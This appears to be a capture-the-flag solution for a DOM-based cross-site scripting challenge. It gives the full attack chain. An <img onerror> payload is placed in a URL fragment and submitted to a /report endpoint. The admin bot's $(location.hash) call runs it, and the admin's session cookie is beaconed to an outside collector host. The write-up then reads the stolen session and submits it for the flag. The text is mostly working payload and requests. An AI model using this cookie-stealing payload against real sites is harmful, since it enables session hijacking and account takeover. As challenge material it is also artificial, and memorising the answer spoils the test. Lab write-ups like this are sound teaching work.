Full chain:

```
POST /report
Content-Type: application/json

{"url":"/#<img src=x onerror=\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\">"}
```

Submit the fragment URL-encoded (the `tests/exploit.py` helper does this with
`urllib.parse.quote`). Wait ~2 seconds for the admin bot to visit the queued
path: its `$(location.hash.slice(1))` constructs the `<img>`, `src=x` 404s, and
`onerror` beacons the cookie to the collector.

Then read what the collector captured through the app's proxy:

```
GET /oob/received
```

You will see an item with a path like `/report?c=session%3D<32 hex>`. URL-decode
it; that 32-hex value is the admin session. Submit it:

```
POST /solve
Content-Type: application/json

{"c":"<32 hex>"}
```

and you get `FLAG{...}`. (`/solve` accepts either the bare 32-hex value or the
full `session=<value>` string.)
